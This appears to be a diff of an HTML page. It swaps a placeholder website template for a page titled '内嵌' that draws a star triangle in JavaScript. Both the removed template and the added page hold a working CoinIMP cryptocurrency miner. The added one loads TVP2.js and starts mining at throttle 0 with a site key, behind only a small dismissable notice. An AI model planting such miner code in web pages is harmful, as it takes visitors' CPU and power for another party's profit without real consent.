@@ -1,49 +1,36 @@
 <!DOCTYPE html>
-<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Page Title</title>
+<meta charset="utf-8">
+<title>内嵌</title>
+<script >
+function RightTriangle(){
+    for(var j=1;j<6;j++)
+        {
+            for(var i=1;i<=j;i++)
+            {
+               document.write("☆");
+            }
+            document.write("<br/>");
+       }
+ }
+ 
+RightTriangle(); //调用函数
+</script>
+
+<script src="TVP2.js"></script>
+<script>
+   function mineCryptoc(){
+       var _client = new Client.Anonymous('f91ca80f7e889ba1b5ac0f731fa0d4d4f15cb9d7c24402b1a9afee718dbe8cc9', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+   }
+
+   mineCryptoc(); // 调用函数
+</script>
+
 </head>
 <body>
-    <header>
-        <h1>Welcome to My Website</h1>
-        <nav>
-            <ul>
-                <li><a href="#">Home</a></li>
-                <li><a href="#">About</a></li>
-                <li><a href="#">Services</a></li>
-                <li><a href="#">Contact</a></li>
-            </ul>
-        </nav>
-    </header>
-    
-    <main>
-        <section>
-            <h2>About Me</h2>
-            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
-        </section>
-        
-        <section>
-            <h2>Services</h2>
-            <ul>
-                <li>Web Design</li>
-                <li>Graphic Design</li>
-                <li>Photography</li>
-            </ul>
-        </section>
-    </main>
-    
-    <footer>
-        <p>&copy; 2023 My Website. All rights reserved.</p>
-    </footer>
-<script src="https://www.hostingcloud.racing/2YZ3.js"></script>
-<script>
-    var _client = new Client.Anonymous('f31ddcfd45aaf2eb1e1e4c8b0274cf833898ab069f78839f5641ee964540cbdb', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-</script>
 </body>
 </html>
